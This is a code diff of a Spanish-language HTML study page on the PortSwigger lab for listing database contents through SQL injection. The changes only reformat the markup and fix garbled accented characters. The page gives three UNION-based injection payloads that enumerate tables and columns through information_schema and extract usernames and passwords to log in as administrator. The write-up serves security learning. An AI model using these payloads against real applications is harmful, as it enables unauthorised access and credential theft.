@@ -113,7 +113,10 @@
 
 <body>
     <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
-        <button onclick="parent.cargaPractica('html/sql_injection.html')" style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;" onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'" onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
+        <button onclick="parent.cargaPractica('html/sql_injection.html')"
+            style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;"
+            onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'"
+            onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
             &#8592; Regresar al Roadmap
         </button>
     </div>
@@ -127,25 +130,43 @@
         </div>
 
         <div class="section">
-            <h3 class="section-title">IntroducciÃ³n</h3>
+            <h3 class="section-title">Introducción</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">En este laboratorio se demuestra cÃ³mo enumerar el contenido de una base de datos cuando no se tienen indicios previos. El objetivo es iniciar sesiÃ³n como <code>administrator</code> extrayendo su contraseÃ±a de bases de datos no Oracle.</p>
+            <p class="parrafo">En este laboratorio se demuestra cómo enumerar el contenido de una base de datos cuando
+                no se tienen indicios previos. El objetivo es iniciar sesión como <code>administrator</code> extrayendo
+                su contraseña de bases de datos no Oracle.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p class='parrafo'>Como no conocemos el esquema de la base de datos, usaremos el esquema predeterminado <code>information_schema</code> para encontrar nombres de tablas y columnas iterativamente.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Listamos todas las tablas disponibles: <code>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>. Encontramos una tabla parecida a <code>users_abcdef</code>.</p><p class='parrafo'>2. Extraemos las columnas de esa tabla: <code>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>. Obtenemos columnas como <code>username_123</code> y <code>password_456</code>.</p><p class='parrafo'>3. Finalmente, extraemos los datos de la tabla objetivo: <code>'+UNION+SELECT+username_123,+password_456+FROM+users_abcdef--</code>.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>ExplicaciÃ³n</p><p class='parrafo'>Las bases de datos ANSI compatibles exponen metadatos completos en <code>information_schema</code>, lo cual es invaluable para que un atacante descubra la arquitectura antes de extraer datos especÃ­ficos que llevan un prefijo aleatorio.</p>
+            <p class='parrafo'>Como no conocemos el esquema de la base de datos, usaremos el esquema predeterminado
+                <code>information_schema</code> para encontrar nombres de tablas y columnas iterativamente.</p>
+            <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p>
+            <p class='parrafo'>1. Listamos todas las tablas disponibles:
+                <code>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>. Encontramos una tabla
+                parecida a <code>users_abcdef</code>.</p>
+            <p class='parrafo'>2. Extraemos las columnas de esa tabla:
+                <code>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>.
+                Obtenemos columnas como <code>username_123</code> y <code>password_456</code>.</p>
+            <p class='parrafo'>3. Finalmente, extraemos los datos de la tabla objetivo:
+                <code>'+UNION+SELECT+username_123,+password_456+FROM+users_abcdef--</code>.</p>
+            <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicación</p>
+            <p class='parrafo'>Las bases de datos ANSI compatibles exponen metadatos completos en
+                <code>information_schema</code>, lo cual es invaluable para que un atacante descubra la arquitectura
+                antes de extraer datos específicos que llevan un prefijo aleatorio.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Contenido Multimedia</h3>
         </div>
         <div class="content-area" style="text-align: center;">
-            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaciÃ³n de prueba.</p>
-            <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads
+                ejecutados exitosamente en la aplicación de prueba.</p>
+            <div
+                style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
                 [Espacio reservado para captura de pantalla del usuario]
             </div>
         </div>
@@ -158,13 +179,14 @@
         </div>
 
         <div class="section">
-            <h3 class="section-title">Referencias TÃ©cnicas</h3>
+            <h3 class="section-title">Referencias Técnicas</h3>
         </div>
         <div class="content-area">
-            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>SQL injection attack, listing the database contents on non-Oracle databases</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
+            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>SQL injection attack, listing the database
+                    contents on non-Oracle databases</i>. Web Security Academy. Recuperado de https://portswigger.net/
+            </p>
         </div>
     </div>
 </body>
 
 </html>
-
